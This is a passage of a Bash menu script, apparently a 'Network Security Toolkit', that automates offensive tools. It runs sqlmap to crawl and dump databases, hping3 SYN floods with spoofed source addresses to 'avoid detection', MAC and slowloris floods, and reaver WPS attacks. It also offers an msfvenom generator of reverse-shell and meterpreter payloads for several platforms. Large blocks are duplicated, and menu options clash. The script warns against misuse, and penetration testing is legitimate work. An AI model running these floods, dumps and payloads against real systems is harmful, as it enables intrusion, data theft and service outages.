					read -p "Provide a wordlist with full path ['d' to use default]: " wordlists
					echo
					if [ "$wordlists" == "d" ]
					then
						echo -e "\e[0;32m[*] Command used - gobuster dir -u $ip_addr -w $(pwd)/directory-list-2.3-medium.txt\e[0m\n"
						gobuster dir -u $ip_addr -w $(pwd)/dependencies/directory-list-2.3-medium.txt
					else
						echo -e "\e[0;32m[*] Command used - gobuster dir -u $ip_addr -w $wordlists\e[0m\n"
						gobuster dir -u $ip_addr -w $wordlists
						echo 
					fi
					;;

					"8")
						read -p "Enter domain name to enumerate: " domain
						read -p "Enter the depth to crawl [1,2,3]: " depth
						read -p "Do you want this scan to be interactive? [Y/n]: " scan 
						if [ "$scan" == "Y" ]
						then
							read -p "Enter the number of threads to use [1,2,3,4]: " threads
							read -p "Do you want to specify a risk level? [Y/n]: " risk
							if [ "$risk" == "Y" ]
							then
								read -p "Enter the level of risk [1,2,3]: " risk_level
								echo 
								sqlmap -u $domain --crawl $depth --threads $threads --risk $risk_level
								echo 
								read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
								if [ "$enum_choice" == "Y" ]
								then
									read -p "Enter the vulnerable domain: " vuln_domain
									echo 
									sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname
									echo 
									read -p "Have you got the database name? [Y/n]: " db_choice
									if [ "$db_choice" == "Y" ]
									then
										read -p "Enter the database name: " db_name
										echo 
										sqlmap -u $vuln_domain -D $db_name --tables
										echo 
										read -p "Have you got the tablename too? [Y/n]: " table 
										if [ "$table" == "Y" ]
										then
											read -p "Enter tablename: " table_name
											sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump
											echo 
										else
											exit
										fi
									else
										exit 
									fi
								else 
									break
								fi
							else
								echo 
								sqlmap -u $domain --crawl $depth --threads $threads 
								echo 
								read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
								if [ "$enum_choice" == "Y" ]
								then
									read -p "Enter the vulnerable domain: " vuln_domain
									echo 
									sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname
									echo 
									read -p "Have you got the database name? [Y/n]: " db_choice
									if [ "$db_choice" == "Y" ]
									then
										read -p "Enter the database name: " db_name
										echo 
										sqlmap -u $vuln_domain -D $db_name --tables
										echo 
										read -p "Have you got the tablename too? [Y/n]: " table 
										if [ "$table" == "Y" ]
										then
											read -p "Enter tablename: " table_name
											sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump
											echo 
										else
											exit
										fi
									else
										exit 
									fi
								else 
									break
								fi
							fi
						elif [ "$scan" == "n" ]
						then
								read -p "Enter the number of threads to use [1,2,3,4]: " threads
								read -p "Do you want to specify a risk level? [Y/n]: " risk
								if [ "$risk" == "Y" ]
								then
									read -p "Enter the level of risk [1,2,3]: " risk_level
									echo 
									sqlmap -u $domain --crawl $depth --threads $threads --risk $risk_level --batch
									echo 
									read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
									if [ "$enum_choice" == "Y" ]
									then
										read -p "Enter the vulnerable domain: " vuln_domain
										echo 
										sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname --batch
										echo 
										read -p "Have you got the database name? [Y/n]: " db_choice
										if [ "$db_choice" == "Y" ]
										then
											read -p "Enter the database name: " db_name
											echo 
											sqlmap -u $vuln_domain -D $db_name --tables --batch
											echo 
											read -p "Have you got the tablename too? [Y/n]: " table 
											if [ "$table" == "Y" ]
											then
												read -p "Enter tablename: " table_name
												sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump --batch
												echo 
											else
												exit
											fi
										else
											exit 
										fi
									else 
										break
									fi
								else
									echo 
									sqlmap -u $domain --crawl $depth --threads $threads --batch
									echo 
									read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
									if [ "$enum_choice" == "Y" ]
									then
										read -p "Enter the vulnerable domain: " vuln_domain
										echo 
										sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname --batch
										echo 
										read -p "Have you got the database name? [Y/n]: " db_choice
										if [ "$db_choice" == "Y" ]
										then
											read -p "Enter the database name: " db_name
											echo 
											sqlmap -u $vuln_domain -D $db_name --tables --batch
											echo 
											read -p "Have you got the tablename too? [Y/n]: " table 
											if [ "$table" == "Y" ]
											then
												read -p "Enter tablename: " table_name
												sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump --batch
												echo 
											else
												exit
											fi
										else
											exit 
										fi
									else 
										break
									fi
								fi
						fi
						;;

					"9")
					echo -e "The ${bold}DOS attack menu${normal} uses some third party attack vector modules taken from the developer's website ${bold}as-is${normal} for the stress testing purposes on a network.\n"
					echo -e "\e[0;31m-=WARNING=- \e[0m NST does not allow/promote an individual to perform these attacks by itself. Use these attack vectors just for educational/legitimate testing purpose on a company network. Illegal/evil use of these modules can lead to imprisonment of an individual.\n"

					echo -e " Select From The Menu:\n"
					echo "  1) SYN-flood attack."
					echo "  2) MAC flood attack."
					echo "  3) DHCP flood attack "
					echo "  4) DNS Poisoning"
					echo "  5) HTTP flood attack"
					echo 
					echo -e " 99) Back a menu.\n"
					while true 
					do
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal} > " dos  

					if [ $dos == "1" ]; then
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter target ip: " ip 
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter the number of packets to send: " packets 
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter the number of bytes to send: " bytes  
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter port number (default 80): " port_number
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Do you want to avoid detection and hide source ip (Y/n): " detect  
						if [ $detect == "Y" ]
						then 
							echo 
							echo -e "\e[0;31m[!] Press ctrl+c to stop the attack.\n\e[0m"
							hping3 -c $packets -d $bytes -S -w 64 -p $port_number --flood --rand-source $ip
						else 
							echo 
							hping3 -c $packets -d $bytes -S -w 64 -p $port_number --flood $ip
						fi 
					elif [ $dos == "2" ]; then 
						echo 
						echo -e " \e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						echo -e " \e[0;36m[!]\e[0m Layer 2 testing..."
						echo -e " \e[0;36m[!]\e[0m MAC flooding has two modes.\n"
						echo " [-] Simple flooding will flood a switch with random MAC addresses."
						echo -e " [-] Targeted flooding will let you specify a target to flood upon.\n"
						read -p "Enter the mode of flooding you wish to perform [S/T]: " mode
						if [ $mode == "S" ]
						then
							read -p "Enter your interface name: " interface
							read -p "Number of packets to send: " packets
							echo 
							echo -e "\e[0;31m[!] Press ctrl+c to stop the attack.\n\e[0m"
							macof -i $interface -n $packets 
						elif [ $mode == "T" ]
						then
							read -p "Enter your interface name: " interface
							read -p "Number of packets to send: " packets
							read -p "Enter target destination ip address: " target_ip
							echo 
							echo -e "\e[0;31m[!] Press ctrl+c to stop the attack.\n\e[0m"
							macof -i $interface -n $packets -d $target_ip
						else 
							echo -e "\e[0;31m[!]\e[0m Enter proper command."
						fi
					elif [ $dos == "3" ]; then
						echo -e "\nDHCP starvation is basically when an attacker sends a lot of DHCP-Request packets to overwhelm a DHCP server.\n"
						echo -e "\e[0;31m [!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						ettercap -G
					elif [ $dos == "4" ]; then
						echo -e "\nDNS poisoning is a type of spoofing attack in which hackers impersonate another device, client or user. \n"
						echo -e "\e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						yersinia -G
					elif [ $dos == "5" ]; then
						echo -e "\nThe primary focus of a DoS attack is to oversaturate the capacity of a targeted machine, resulting in denial-of-service to additional requests.\n"
						echo -e "\e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						# read -p "[+] Checking if target has an active apache2 service running..."

						read -p "Enter the target ip address: " target_ip
						read -p "Enter port number (default 80): " port_num
						read -p "Specify sockets to use: " sockets
						read -p "Do you wish to use proxy [y/N]: " proxy
						if [ $proxy == "y" ]; then
							read -p "Specify protocol type for the requests [HTTP/HTTPS]: " requests
							if [ $requests == "HTTPS" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --useproxy --https -v
							elif [ $requests == "HTTP" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --useproxy --http -v
							else 
								echo -e "\e[0;31m[!]\e[0m Enter proper option."
							fi
						elif [ $proxy == "N" ]; then
							read -p "Specify protocol type for the requests [HTTP/HTTPS]: " requests
							if [ $requests == "HTTPS" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --https -v
							elif [ $requests == "HTTP" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --http -v
							else 
								echo -e "\e[0;31m[!]\e[0m Enter proper option."
							fi
						else 
							echo -e "\e[0;31m[!] Enter proper option.\e[0m"
						fi
					else 
						echo -e "\e[0;31m[!] Enter option between [1-5].\e[0m "
					fi
					done
					;;
				esac
				done
			}











			pentesting()
			{
				# sleep 1
				echo -e "\e[1;36m[-]\e[0m Checking for requirements. "
				sleep 1 
				echo -e "\e[1;36m[-]\e[0m requirements satisfied. "
				# sleep 1
				PENTESTING_BANNER
				# clear
				# banner 
				# details 
				echo "Welcome to the NST's ${bold}Rapid Penetration-testing menu.${normal} This pentesting-automator can perform numerous tasks 
such as web-scanning, brute forcing, wireless attacks, etc. This automator uses some third-party tools which are 
downloaded from the developer's website ${bold}as-is${normal} with proper credits mentioned under the ${bold}README.md${normal} file. "
				keyboard_interruptt()
				{
					echo ""
					clear 
					banner 
					details 
					echo 
					main
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
				echo -e "\n Select From The Menu:"
				echo ""
				echo "  1) Target-related wordlist generator(done)"
				echo "  2) Third-party payload generator(done)"
				echo "  3) Web-directories enumerator(done)"
				echo "  4) Open source intelligence"
				echo "  5) Wireless attacks"
				echo "  6) Port scanning "
				echo "  7) Wordlists downloader"
				echo "  8) Hash identifier/cracker"
				echo "  9) Denial of service(done)"
				echo " 10) Wordpress scanner"
				echo " 11) Joomla scanner"
				echo " 12) Web-reconnaissance"
				echo " 13) SQL injection(done)"
				echo " 14) Password Cracker"
				echo " 15) Search for an exploit from Exploit-DB"
				echo 
				echo " 99) Back to main menu"
				while true
				do
				under=$(tput smul)
				normal=$(tput sgr0)
				echo -n -e "\n\e[0;0m${under}nst${normal}:\e[0;0m${under}pentesting${normal} > "
				read  pen_choice
				echo ""
				case ${pen_choice} in 
					"1")
					python3 /usr/share/ntoolkit/dependencies/dependencies/cupp.py -i
					;; 

					"2")
					echo -e " List of payloads:\n"
					echo -e "\e[0;32m${bold}LINUX:\e[0m${normal}\n"
					echo "1) linux/x86/meterpreter/reverse_tcp"
					echo "2) linux/x64/meterpreter/reverse_tcp"
					echo "3) linux/x86/shell/reverse_tcp"
					echo "4) linux/x64/shell/reverse_tcp"
					echo "5) payload/linux/x86/adduser"
					echo "6) payload/linux/x86/meterpreter_reverse_https"
					echo "7) payload/linux/x64/meterpreter_reverse_https"
					echo "8) payload/linux/mipsbe/shell_bind_tcp"
					echo "9) payload/linux/mipsle/shell_bind_tcp"
					echo
					echo -e "\e[0;32m${bold}WINDOWS:\e[0m${normal}\n" 
					echo "10) windows/x64/meterpreter_reverse_https"
					echo "11) windows/x64/meterpreter_reverse_tcp"
					echo "12) windows/x64/meterpreter_reverse_tcp"
					echo "13) exploit/windows/http/apache_tika_jp2_jscript"
					echo "14) exploit/multi/http/tomcat_mgr_upload"
					echo "15) payload/generic/debug_trap"
					echo "16) payload/windows/dllinject/reverse_tcp_rc4"
					echo "17) payload/windows/shell/bind_tcp"
					echo "18) payload/cmd/windows/reverse_powershell"
					echo
					echo -e "\e[0;32m${bold}OSX:\e[0m${normal}\n"  
					echo "19) payload/osx/armle/shell_bind_tcp"
					echo "20) payload/osx/x86/vforkshell_reverse_tcp"
					echo "21) payload/osx/x86/exec"
					echo "22) payload/osx/x64/exec"
					echo "23) payload/osx/x64/meterpreter_reverse_http"
					echo "24) payload/osx/x64/meterpreter_reverse_https"
					echo "25) payload/osx/x64/meterpreter_reverse_tcp"
					echo "26) exploit/multi/browser/java_jre17_driver_manager"
					echo 
					echo -e "\e[0;32m${bold}ANDROID:\e[0m${normal}\n" 
					echo "27) payload/android/meterpreter_reverse_http (Inline)"
					echo "28) payload/android/meterpreter_reverse_https (Inline)"
					echo "29) payload/android/meterpreter_reverse_tcp (Inline)"
					echo "30) payload/android/shell/reverse_http (stager)"
					echo "31) payload/android/shell/reverse_https (stager)"
					echo "32) payload/android/shell/reverse_tcp (stager)"
					echo 
					echo -e "99) Back to the previous menu\n"
					
					under=$(tput smul)
					normal=$(tput sgr0)
					# echo -e "\e[0;36m"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Your choice (write full name|'99' for exit): " payload_option
					echo -e "Payload set to => \e[0;31m$payload_option\e[0m"
					if [ "$payload_option" == "99" ]
					then
						clear
						banner 
						details 
						echo 
						pentesting
					fi
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Set LHOST: " lhost
					echo -e "LHOST => $lhost"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Set LPORT: " lport
					echo -e "LPORT => $lport"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Set RHOST: " rhost
					echo -e "RHOST => $rhost"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Do you wish to 4encode the payload(y/N): " encode
					if [ "$encode" == "y" ]
					then
						read -p "Encoder to use(type 'list' for the list of encoders): " encoder_to_use
						if [ "$encoder_to_use" == "list" ]
						then
							cat $(pwd)/dependencies/encoder.txt
							echo
							read -p "Encoder to use(type 'list' for the list of encoders): " encoder_to_use1
							read -p "Extension(exe/apk/bat/sh/php): " extension
							msfvenom -p $payload_option LHOST=$lhost LPORT=$lport > /usr/share/ntoolkit/payloads/payload.$extension -e $encoder_to_use1
							echo 
							echo -e "Payload generated and has been saved to '\e[0;32m/usr/share/ntoolkit/payloads/payload.$extension\e[0m'"
							echo 
						fi 
					else
						read -p "Extension(exe/apk/bat/sh/php): " extension
						msfvenom -p $payload_option LHOST=$lhost LPORT=$lport > /usr/share/ntoolkit/payloads/payload.$extension
						echo 
						echo -e "Payload generated and has been saved to '\e[0;32m/usr/share/ntoolkit/payloads/payload.$extension\e[0m'"
						echo 
					fi
					;;

					"3")
					echo -n "Enter ip address/domain name: " 
					read ip_addr
					read -p "Provide a wordlist with full path ['d' to use default]: " wordlists
					echo
					if [ "$wordlists" == "d" ]
					then
						echo -e "\e[0;32m[*] Command used - gobuster dir -u $ip_addr -w $(pwd)/directory-list-2.3-medium.txt\e[0m\n"
						gobuster dir -u $ip_addr -w $(pwd)/dependencies/directory-list-2.3-medium.txt
					else
						echo -e "\e[0;32m[*] Command used - gobuster dir -u $ip_addr -w $wordlists\e[0m\n"
						gobuster dir -u $ip_addr -w $wordlists
						echo 
					fi
					;;

					"8")
						read -p "Enter domain name to enumerate: " domain
						read -p "Enter the depth to crawl [1,2,3]: " depth
						read -p "Do you want this scan to be interactive? [Y/n]: " scan 
						if [ "$scan" == "Y" ]
						then
							read -p "Enter the number of threads to use [1,2,3,4]: " threads
							read -p "Do you want to specify a risk level? [Y/n]: " risk
							if [ "$risk" == "Y" ]
							then
								read -p "Enter the level of risk [1,2,3]: " risk_level
								echo 
								sqlmap -u $domain --crawl $depth --threads $threads --risk $risk_level
								echo 
								read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
								if [ "$enum_choice" == "Y" ]
								then
									read -p "Enter the vulnerable domain: " vuln_domain
									echo 
									sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname
									echo 
									read -p "Have you got the database name? [Y/n]: " db_choice
									if [ "$db_choice" == "Y" ]
									then
										read -p "Enter the database name: " db_name
										echo 
										sqlmap -u $vuln_domain -D $db_name --tables
										echo 
										read -p "Have you got the tablename too? [Y/n]: " table 
										if [ "$table" == "Y" ]
										then
											read -p "Enter tablename: " table_name
											sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump
											echo 
										else
											exit
										fi
									else
										exit 
									fi
								else 
									break
								fi
							else
								echo 
								sqlmap -u $domain --crawl $depth --threads $threads 
								echo 
								read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
								if [ "$enum_choice" == "Y" ]
								then
									read -p "Enter the vulnerable domain: " vuln_domain
									echo 
									sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname
									echo 
									read -p "Have you got the database name? [Y/n]: " db_choice
									if [ "$db_choice" == "Y" ]
									then
										read -p "Enter the database name: " db_name
										echo 
										sqlmap -u $vuln_domain -D $db_name --tables
										echo 
										read -p "Have you got the tablename too? [Y/n]: " table 
										if [ "$table" == "Y" ]
										then
											read -p "Enter tablename: " table_name
											sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump
											echo 
										else
											exit
										fi
									else
										exit 
									fi
								else 
									break
								fi
							fi
						elif [ "$scan" == "n" ]
						then
								read -p "Enter the number of threads to use [1,2,3,4]: " threads
								read -p "Do you want to specify a risk level? [Y/n]: " risk
								if [ "$risk" == "Y" ]
								then
									read -p "Enter the level of risk [1,2,3]: " risk_level
									echo 
									sqlmap -u $domain --crawl $depth --threads $threads --risk $risk_level --batch
									echo 
									read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
									if [ "$enum_choice" == "Y" ]
									then
										read -p "Enter the vulnerable domain: " vuln_domain
										echo 
										sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname --batch
										echo 
										read -p "Have you got the database name? [Y/n]: " db_choice
										if [ "$db_choice" == "Y" ]
										then
											read -p "Enter the database name: " db_name
											echo 
											sqlmap -u $vuln_domain -D $db_name --tables --batch
											echo 
											read -p "Have you got the tablename too? [Y/n]: " table 
											if [ "$table" == "Y" ]
											then
												read -p "Enter tablename: " table_name
												sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump --batch
												echo 
											else
												exit
											fi
										else
											exit 
										fi
									else 
										break
									fi
								else
									echo 
									sqlmap -u $domain --crawl $depth --threads $threads --batch
									echo 
									read -p "Do you wish to further enumerate the vulnerable site? [Y/n]: " enum_choice
									if [ "$enum_choice" == "Y" ]
									then
										read -p "Enter the vulnerable domain: " vuln_domain
										echo 
										sqlmap -u $vuln_domain --current-db --current-user --dbs --hostname --batch
										echo 
										read -p "Have you got the database name? [Y/n]: " db_choice
										if [ "$db_choice" == "Y" ]
										then
											read -p "Enter the database name: " db_name
											echo 
											sqlmap -u $vuln_domain -D $db_name --tables --batch
											echo 
											read -p "Have you got the tablename too? [Y/n]: " table 
											if [ "$table" == "Y" ]
											then
												read -p "Enter tablename: " table_name
												sqlmap -u $vuln_domain -D $db_name -T $table_name --columns --dump --batch
												echo 
											else
												exit
											fi
										else
											exit 
										fi
									else 
										break
									fi
								fi
						fi
						;;

					"9")
					echo -e "The ${bold}DOS attack menu${normal} uses some third party attack vector modules taken from the developer's website ${bold}as-is${normal} for the stress testing purposes on a network.\n"
					echo -e "\e[0;31m-=WARNING=- \e[0m NST does not allow/promote an individual to perform these attacks by itself. Use these attack vectors just for educational/legitimate testing purpose on a company network. Illegal/evil use of these modules can lead to imprisonment of an individual.\n"

					echo -e " Select From The Menu:\n"
					echo "  1) SYN-flood attack."
					echo "  2) MAC flood attack."
					echo "  3) DHCP flood attack "
					echo "  4) DNS Poisoning"
					echo "  5) HTTP flood attack"
					echo 
					echo -e " 99) Back a menu.\n"
					while true 
					do
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal} > " dos  

					if [ $dos == "1" ]; then
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter target ip: " ip 
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter the number of packets to send: " packets 
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter the number of bytes to send: " bytes  
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Enter port number (default 80): " port_number
						read -p "${under}nst${normal}:${under}pentesting${normal}:${under}dos${normal}:${under}syn-flood${normal} > Do you want to avoid detection and hide source ip (Y/n): " detect  
						if [ $detect == "Y" ]
						then 
							echo 
							echo -e "\e[0;31m[!] Press ctrl+c to stop the attack.\n\e[0m"
							hping3 -c $packets -d $bytes -S -w 64 -p $port_number --flood --rand-source $ip
						else 
							echo 
							hping3 -c $packets -d $bytes -S -w 64 -p $port_number --flood $ip
						fi 
					elif [ $dos == "2" ]; then 
						echo 
						echo -e " \e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						echo -e " \e[0;36m[!]\e[0m Layer 2 testing..."
						echo -e " \e[0;36m[!]\e[0m MAC flooding has two modes.\n"
						echo " [-] Simple flooding will flood a switch with random MAC addresses."
						echo -e " [-] Targeted flooding will let you specify a target to flood upon.\n"
						read -p "Enter the mode of flooding you wish to perform [S/T]: " mode
						if [ $mode == "S" ]
						then
							read -p "Enter your interface name: " interface
							read -p "Number of packets to send: " packets
							echo 
							echo -e "\e[0;31m[!] Press ctrl+c to stop the attack.\n\e[0m"
							macof -i $interface -n $packets 
						elif [ $mode == "T" ]
						then
							read -p "Enter your interface name: " interface
							read -p "Number of packets to send: " packets
							read -p "Enter target destination ip address: " target_ip
							echo 
							echo -e "\e[0;31m[!] Press ctrl+c to stop the attack.\n\e[0m"
							macof -i $interface -n $packets -d $target_ip
						else 
							echo -e "\e[0;31m[!]\e[0m Enter proper command."
						fi
					elif [ $dos == "3" ]; then
						echo -e "\nDHCP starvation is basically when an attacker sends a lot of DHCP-Request packets to overwhelm a DHCP server.\n"
						echo -e "\e[0;31m [!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						ettercap -G
					elif [ $dos == "4" ]; then
						echo -e "\nDNS poisoning is a type of spoofing attack in which hackers impersonate another device, client or user. \n"
						echo -e "\e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						yersinia -G
					elif [ $dos == "5" ]; then
						echo -e "\nThe primary focus of a DoS attack is to oversaturate the capacity of a targeted machine, resulting in denial-of-service to additional requests.\n"
						echo -e "\e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
						# read -p "[+] Checking if target has an active apache2 service running..."

						read -p "Enter the target ip address: " target_ip
						read -p "Enter port number (default 80): " port_num
						read -p "Specify sockets to use: " sockets
						read -p "Do you wish to use proxy [y/N]: " proxy
						if [ $proxy == "y" ]; then
							read -p "Specify protocol type for the requests [HTTP/HTTPS]: " requests
							if [ $requests == "HTTPS" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --useproxy --https -v
							elif [ $requests == "HTTP" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --useproxy --http -v
							else 
								echo -e "\e[0;31m[!]\e[0m Enter proper option."
							fi
						elif [ $proxy == "N" ]; then
							read -p "Specify protocol type for the requests [HTTP/HTTPS]: " requests
							if [ $requests == "HTTPS" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --https -v
							elif [ $requests == "HTTP" ]; then 
								slowloris -h $target_ip -p $port_num -s $sockets --http -v
							else 
								echo -e "\e[0;31m[!]\e[0m Enter proper option."
							fi
						else 
							echo -e "\e[0;31m[!] Enter proper option.\e[0m"
						fi
					else 
						echo -e "\e[0;31m[!] Enter option between [1-5].\e[0m "
					fi
					done
					;;

					"5")

					WIRELESS_DISCOVERY()
					{
						echo -e "\n\e[0;36m[-]\e[0m Discovering devices..."
						echo -e "\e[0;31m[-] Press 'Q' twice to stop the scanning.\e[0m\n"
						airodump-ng $iname1
						echo 
					}

					WPS_ATTACK_VECTOR()
					{
						echo -e "\n\e[0;36m[-]\e[0m Discovering devices..."
						echo -e "\e[0;31m[-] Press 'Q' twice to stop the scanning.\e[0m\n"
						airodump-ng $iname1
						echo 
						read -p "[>] Enter the target BSSID: " bssid
						read -p "[>] Enter the target channel: " channel
						echo 
						reaver -i $iname1 -b $bssid -c $channel -K 1 -vv -f
					}
					#catching keyboard interruption
					keyboard_interruptt()
					{
						echo ""
						echo -e "\e[0;31m[!] Interruption detected."
						echo -e "\e[0;36m[+]\e[0m Reverting back the changes."
						airmon-ng stop $iname1 > /usr/share/ntoolkit/.monitor_disable
						service NetworkManager restart 2>/dev/null
						echo -e "\e[0;36m[+]\e[0m Turned $iname1 back to managed mode."
						sleep 2
						clear 
						banner 
						details 
						echo 
						pentesting
						exit 2
					}
					trap "keyboard_interruptt" 2
					iname=$(iw dev | awk '$1=="Interface"{print $2}')
					echo -e "Welcome to the NST's third-party ${bold}Wireless-attacks vector${normal} section. This module is basically designed to help you with the 
automation tasks related to Wireless Penetration-testing.\n"

					if ! [ $(iw dev | awk '$1=="Interface"{print $2}') ]
					then
							sleep 1
					        echo -e "\e[0;36m[+]\e[0m Wireless interface not detected. Redirecting to the previous menu." 
					        sleep 2
					        clear 
					        banner 
					        details 
					        echo 
					        pentesting
					else
					        echo -e "\e[0;36m[+]\e[0m Wireless interface detected: $(iw dev | awk '$1=="Interface"{print $2}')"
					        echo -e "\e[0;36m[+]\e[0m Turning $iname into monitor mode by default."
					        airmon-ng check kill > /usr/share/ntoolkit/.monitor_check_kill
					        airmon-ng start $iname > /usr/share/ntoolkit/.monitor_enable
					        iname1=$(iw dev | awk '$1=="Interface"{print $2}')
					        echo -e "\e[0;36m[+]\e[0m Now your new wireless interface is: $iname1\n" 
					        echo -e "\e[0;31m[!]\e[0m Do not use this module for ${bold}evil${normal}. You are strictly warned...\n"
					fi
					echo -e " Select From The Menu: \n"
					echo -e "  1) Initiate the discovery of wireless networks."
					echo -e "  2) Initiate the WPS attack vector."
					echo -e "  3) Initiate the WEP attack vector."
					echo -e "  4) Initiate the WPA attack vector."
					echo -e "  5) Initiate a wireless DOS/DDOS attack vector."
					echo -e "  6) Initiate an Evil-Twin attack vector."
					echo -e "  7) Turn your wireless interface into managed mode.\n"
					echo -e " 99) Back a menu\n"
					while true 
					do
					read -p "[>] Your choice: " wireless_choice

					if [ $wireless_choice == "99" ] 2>/dev/null; then
						echo -e "\e[0;36m[+]\e[0m Reverting back the changes."
						airmon-ng stop $iname1 > /usr/share/ntoolkit/.monitor_disable
						service NetworkManager restart 2>/dev/null
						echo -e "\e[0;36m[+]\e[0m Turned $iname1 back to managed mode."
						sleep 2
						clear 
						banner 
						details 
						echo 
						pentesting
					elif [ $wireless_choice == "1" ]; then
						WIRELESS_DISCOVERY

					elif [ $wireless_choice == "2" ]; then
						WPS_ATTACK_VECTOR

					else
						echo -e "\e[0;31m[!] Enter valid option\e[0m"

				 fi
				 done
			
					;;

					"7")
					# read -p "Enter the hash: " hash
					# echo 
					echo -e " Select From The Menu:"
					echo 
					echo "  1) Identify the hash "
					echo "  2) Crack the hash "
					echo 
					read -p "Enter your choice: " choice 
					if [ $choice == "1" ]
					then
						hash-identifier
						exit 
					# elif [ $choice == "2" ]
					# then

					fi
					;;


					"9")
					read -p "Enter an ip address to attack: " domain1
					read -p "Enter an ip address to attack from: " my_ip
					echo 
					echo -e "\e[0;31m[!] Press 'ctrl+c' to stop the attack\e[0m\n"
					hping3 -S $domain1 -a $my_ip --flood
					echo 
					;;

					"99")
					clear 
					banner 
					details 
					echo 
					main
					;;
					
				esac
				done
		    }
		    
			main()
			{
				
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
					echo
					echo -e " Select From The Menu:"
					echo ""
					echo "  1) Network Troubleshoot"
					echo "  2) Protocol Enumerator"
					echo "  3) Trace Eraser"
					echo "  4) Firewall Configuration"
					echo "  5) Incidence Response (Uncover)"
					echo "  6) Penetration Testing (rapid)"
					echo "  7) Update NST configuration"
					echo "  8) Help/Credits/About the Network-Security Toolkit"
					echo ""
					echo " 99) Exit the Network-Security Toolkit"
					# echo ""
					while true
					do
					under=$(tput smul)
					normal=$(tput sgr0)
					# echo -e "\e[0;36m"
					echo 
					read -p "${under}nst${normal} > " option
					# echo ""

					#Conditional statements 
					if [ "$option" == "1" ]
					then
						echo 
						networking
					elif [ "$option" == "2" ]
					then
						Protocol_enum
					elif [ "$option" == "3"  ]
					then
						port_scanner
					elif [ "$option" == "3"  ]
					then
						clear_logs
					elif [ "$option" == "4" ]
					then
						firewall
					elif [ "$option" == "5" ]
					then
						incidence_resp
					elif [ "$option" == "6"  ]
					then
						pentesting
					elif [ "$option" == "7" ]
					then
						sleep 1
						clear 
						banner 
						details 
						details2
						main
					elif [ "$option" == "8" ]
					then 
						cat $(pwd)/dependencies/README.md
						echo -e "   Press \e[0;31m<enter>\e[0m to continue."
						read -n 1 -s -r 
					elif [ "$option" == "motivate me" ]
					then
						echo
						motivate | cowsay -f tux
					elif [ "$option" == "hugs" ]
					then
						echo -e "\e[0;0m [!] Hey! here's your free HUG \e[0m\n"
						echo -e "Press \e[0;31m<enter>\e[0m if you recieved it..."
						read -n 1 -s -r 
						# echo ""
					elif [ "$option" == "clear" ]
					then
						clear 
						banner 
						details 
						# details2
						# echo 
						main
					elif [ "$option" == "99"  ]
					then

						echo ""
						# echo -e "\e[0;35m Thanks for using The Network Security Toolkit! See you next time...\e[0m "
